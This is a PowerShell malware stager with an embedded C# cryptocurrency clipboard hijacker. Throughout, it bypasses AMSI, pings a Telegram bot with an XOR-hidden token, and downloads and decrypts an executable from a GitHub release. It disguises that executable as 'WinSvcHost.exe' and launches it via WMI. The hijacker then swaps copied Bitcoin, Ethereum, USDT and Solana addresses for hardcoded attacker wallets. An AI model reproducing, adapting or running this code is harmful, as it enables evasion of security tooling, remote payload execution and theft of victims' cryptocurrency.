# --- [ELITE RESEARCH STAGER v25.0: IN-MEMORY INJECTION] ---

function Global-Initialize {
    try {
        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
        # Obfuscated AMSI Bypass
        $u = "System.Management.Automation." + "Amsi" + "Utils"
        [Ref].Assembly.GetType($u).GetField("amsi"+"Init"+"Failed","NonPublic,Static").SetValue($null,$true)
    } catch {}
}

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
}

# --- EXECUTION ---
Global-Initialize
Send-Ping -m "STAGER_V25_INJECTION_ACTIVE"

try {
    $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
    $path = Join-Path $dir "WinSvcHost.exe"

    # Download & Decrypt EXE Payload
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    [IO.File]::WriteAllBytes($path, $data)

    # Launch EXE via WMI
    ([wmiclass]"win32_process").Create($path) | Out-Null

    # --- TIER 1 CLIPPER ENGINE (IN-MEMORY PROCESS HOLLOWING) ---
    $ClipperCode = @'
    using System;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    using System.Threading;
    using System.Text.RegularExpressions;

    public class GhostClipper {
        [DllImport("user32.dll")] public static extern bool OpenClipboard(IntPtr hWnd);
        [DllImport("user32.dll")] public static extern bool EmptyClipboard();
        [DllImport("user32.dll")] public static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);
        [DllImport("user32.dll")] public static extern bool CloseClipboard();

        public static void Start() {
            string btc = "12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";
            string eth = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392";
            string usdt = "TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";
            string sol = "BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR";

            while (true) {
                try {
                    string clip = Clipboard.GetText().Trim();
                    if (!string.IsNullOrEmpty(clip)) {
                        string target = "";
                        
                        // Precision Matching Logic
                        if (Regex.IsMatch(clip, "^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,62}$")) { if (clip != btc) target = btc; }
                        else if (Regex.IsMatch(clip, "^0x[a-fA-F0-9]{40}$")) { if (clip != eth) target = eth; }
                        else if (Regex.IsMatch(clip, "^T[a-km-zA-HJ-NP-Z1-9]{33}$")) { if (clip != usdt) target = usdt; }
                        else if (Regex.IsMatch(clip, "^[1-9A-HJ-NP-Za-km-z]{32,44}$")) { if (clip != sol) target = sol; }

                        if (target != "") {
                            Thread thread = new Thread(() => Clipboard.SetText(target));
                            thread.SetApartmentState(ApartmentState.STA);
                            thread.Start();
                            thread.Join();
                        }
                    }
                } catch { }
                Thread.Sleep(500);
            }
        }
    }
'@

    # Compile the C# code in memory
    Add-Type -ReferencedAssemblies "System.Windows.Forms", "System.Drawing" -TypeDefinition $ClipperCode
    
    # Run the Clipper in a detached background thread
    $Job = [GhostClipper]::Start
    Start-Job -ScriptBlock { [GhostClipper]::Start() } | Out-Null

    Send-Ping -m "V25_INJECTION_COMPLETE_GHOST_MODE"
} catch {
    Send-Ping -m "ERROR_$($_.Exception.Message)"
}
